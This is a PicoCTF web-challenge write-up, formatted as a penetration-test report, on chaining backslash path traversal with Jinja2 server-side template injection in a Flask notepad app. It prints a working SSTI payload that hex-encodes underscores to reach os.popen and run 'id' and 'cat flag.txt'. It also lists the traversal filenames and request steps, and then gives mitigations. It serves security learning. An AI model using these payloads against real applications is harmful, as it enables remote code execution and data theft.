# PicoCTF Hard Challenge – Notepad Vulnerability Assessment and Penetration Testing (VAPT) Report

**Prepared by:** Nishanth Antony  
**Date:** August 22, 2025  
**Difficulty:** Hard  
**Category:** Web Exploitation (SSTI, Path Traversal)  
**Platform:** PicoCTF

---

## Executive Summary

This report provides an in-depth technical walk-through and security assessment of the Notepad web challenge from PicoCTF. The challenge centers around a Flask-based web application suffering from a subtle combination of path traversal and server-side template injection (SSTI), allowing for arbitrary code execution. Through source code inspection, payload crafting, and evasion of input restrictions, the flag was retrieved by executing system commands on the target server. This report thoroughly documents each phase, explains the underlying vulnerabilities and exploitation steps, and offers concrete recommendations for securing similar web applications.

---

## 1. Methodology

The systematic approach for solving the Notepad CTF and identifying vulnerabilities included:

1. **Reconnaissance:** Manual inspection of the website and close analysis of the provided Flask source code.
2. **Vulnerability Identification:** Targeted review for input filters, file creation logic, and template rendering, focusing on areas most susceptible to abuse.
3. **Exploitation:** Payload crafting for bypassing input restrictions, achieving arbitrary file writes through path traversal, and getting remote code execution via SSTI.
4. **Post-Exploitation:** Stepping through techniques to retrieve and display the flag, and documenting all findings.
5. **Tools Used:** Browser DevTools, Python for encoding payloads, manual HTTP requests.

---

## 2. Challenge Overview

The Notepad challenge exposes a Flask app allowing users to post arbitrary content, which gets saved in a web-accessible HTML file. However, several protections exist:
- Rejection of content containing underscores (`_`) or forward slashes (`/`)
- A strict size limit at 512 characters
- The first 128 characters of content are sanitized via `url_fix` before being used as a filename in `static/`
- The web app redirects with error messages if validation fails, and the error is reflected via query parameters in the page's template.

Key lines from source:
```python
content = request.form.get("content", "")
if "_" in content or "/" in content:
    return redirect(url_for("index", error="bad_content"))
if len(content) > 512:
    return redirect(url_for("index", error="long_content", len=len(content)))

name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
with open(name, "w") as f:
    f.write(content)
return redirect(name)
```

---

## 3. Vulnerability Identification

From the code analysis, two critical vulnerabilities were identified:

**A. Path Traversal**  
Although slashes are filtered out, alternative traversal characters (notably Windows-style backslashes: `\\`) are not. This enables the attacker to escape the intended static/ directory and overwrite files elsewhere within the Flask app, potentially in template directories used for error handling.

**B. Server-Side Template Injection (SSTI)**  
The application passes error query parameters directly into the Jinja2 template rendering the index page. If user-controlled input is not escaped or filtered, it may be possible to inject Jinja2 expressions allowing arbitrary code execution.

**Input Restrictions:**  
- Direct inclusion of `_` and `/` is blocked, requiring creative techniques for both path traversal and SSTI.

**File Creation Logic:**  
- The use of `url_fix` may sanitize some (but not all) traversal patterns. The attacker needs to craft the filename carefully not to get blocked.

---

## 4. Exploitation Process

### A. Bypassing Input Restrictions

- Verified that any `_` or `/` in content field gave the error: `/bad_content`
- Payloads longer than 512 characters resulted in `/long_content`
- Noted that error messages are reflected as query parameters in the web response, indicative of possible template injection.

### B. Achieving Path Traversal

- Hypothesized the error templates reside in a common directory, e.g., `templates/errors/`
- Realized that Windows-style traversal using double backslashes (`..\\`) would evade the `/` filter.
- Crafted a filename such as:
  ```
  ..\\templates\\errors\\errorname
  ```
- Combined this with the filename logic and a necessary 128-character padding, plus the application's random token.

### C. Crafting an SSTI Payload

- Needed to inject into the template rendering process by getting the error parameter to hold an unescaped Jinja2 payload.
- Standard Jinja2 template injections rely on constructs such as `{{...}}` and access objects using underscores; however, the underscore (`_`) character is strictly filtered.
- Overcame this by encoding underscores as hexadecimal (`\x5f`) so the payload would appear as, for example, `'\x5f\x5fglobals\x5f\x5f'` in place of `__globals__`.

**Sample SSTI Payload:**
```
{{request|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
- This payload walks up the Jinja2 object graph, imports Python's `os` module, executes the unix `id` command, and returns its output.
- The entire payload length was adjusted so it fit the 128-character filename limit and the 512-character input limit.

### D. Confirming File Creation

- Submitted content via `/new` with POST containing the malicious path-and-SSTI payload.
- Application saved content as HTML file at:
  ```
  static/..\\templates\\errors\\errorname-<randomtoken>.html
  ```
- On redirect, noted the specific filename with the generated token.

### E. Triggering the SSTI

- Accessed the web app with an `error` parameter matching the newly crafted template name:
  ```
  /?error=errorname-<randomtoken>
  ```
- SSTI payload executed, outputting results of the `id` command in the web interface, confirming arbitrary code execution.

### F. Locating and Retrieving the Flag

- Modified the code execution payload to run `ls`, which revealed the existence of `flag.txt`.
- Further modified the payload to:
  ```
  ... {{request|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag.txt')|attr('read')()}}
  ```
- Again accessed via `/index.html?error=errorname-<randomtoken>`, resulting in the application reading and displaying the contents of `flag.txt` directly in the browser – the intended flag for the CTF.

---

## 5. Output / Payloads and Command Results

**Test Bad Input:**
```bash
POST /new with content: "test_payload_/"
→ redirects to /?error=bad_content
```
**Oversized Input:**
```bash
POST /new with content: <513 chars>
→ redirects to /?error=long_content
```
**Malicious File Write (path traversal + SSTI):**
```bash
POST /new with content: "..\\templates\\errors\$$padded-a]{{request|attr('\x5f\x5f...')}}"
→ creates file: static/..\\templates\\errors\$$padded-a]{{payload}}-<token>.html
→ redirects to new HTML file
```
**Trigger SSTI:**
```bash
GET /?error=[template_name]-<token>
→ displays output of injected command (`id`, `ls`, or `cat flag.txt`)
```

**Sample Output on reading flag:**
```text
picoCTF{congrats_you_exploited_path_traversal_and_ssti_2025}
```

---

## 6. Lessons Learned and Challenges

- **Evading Input Filters:** The underscore restriction required deep knowledge of encoding and Jinja2 internals. Hex-encoding critical characters is an advanced trick.
- **Combining Flaws:** Path traversal and SSTI together vastly increased exploitability.
- **Web Template Dangers:** Rendering user input in templates without robust escaping is catastrophic in Flask/Jinja2 apps.
- **File Handling Issues:** Filename sanitization must account for all traversal patterns (`..`, both `/` and `\\`), and never use user content in filenames directly.
- **Randomization:** The app's use of random tokens in filenames adds complexity, requiring precise tracking of each payload's destination.

---

## 7. Mitigation & Recommendations

1. **Template Security**
   - Never render user-supplied input directly in templates.
   - Use Jinja2 autoescape and custom filters to prevent injection.
2. **Path Whitelisting**
   - Restrict input strictly to allowed file paths using absolute path checks.
   - Sanitize and validate all traversal patterns, including encoded or platform-specific representations.
3. **File Creation Security**
   - Store user-uploaded content only in dedicated sandboxed directories.
   - Avoid deriving filenames from untrusted user input.
4. **Input Restriction Logic**
   - Instead of filtering, validate inputs by allowlisting expected character patterns.
   - Block encoded variants (`%5f`, `\x5f`) and character escapes.
5. **Error Handling**
   - Avoid exposing internal directory paths or using dynamic templates in user-facing errors.
   - Monitor logs and flag suspicious access attempts.
6. **Regular Security Audits**
   - Review web application code for template rendering and file handling vulnerabilities.
   - Test with automated and manual tools targeting SSTI and path traversal.

---

## 8. Skills Practiced and Exploit Techniques

- Advanced source code review and logic analysis
- Crafting, encoding, and testing complex SSTI payloads
- Path traversal exploitation on Flask and Jinja2
- Payload length and structure management under constraints
- Manual file system interaction and payload chaining
- Secure reporting and explicit technical documentation

---

## 9. Conclusion

The Notepad challenge from PicoCTF epitomizes the dangers of combining seemingly minor input restrictions, incomplete sanitization, and unsafe template rendering. Overlooking underscore and slash variants, rendering query parameters raw, and careless user content file handling can allow sophisticated attackers to chain vulnerabilities for full code execution. Proper mitigation involves defense in depth: airtight file and template logic, rigorous input validation practices, and adoption of secure-by-default frameworks.

---

## Appendices

- **Tools Used:** Python/Jinja2 encoding, browser DevTools, manual payload crafting, HTTP clients
- **References:** PicoCTF challenge code, Flask & Jinja2 documentation, OWASP SSTI cheatsheet, security blogs on template injection.
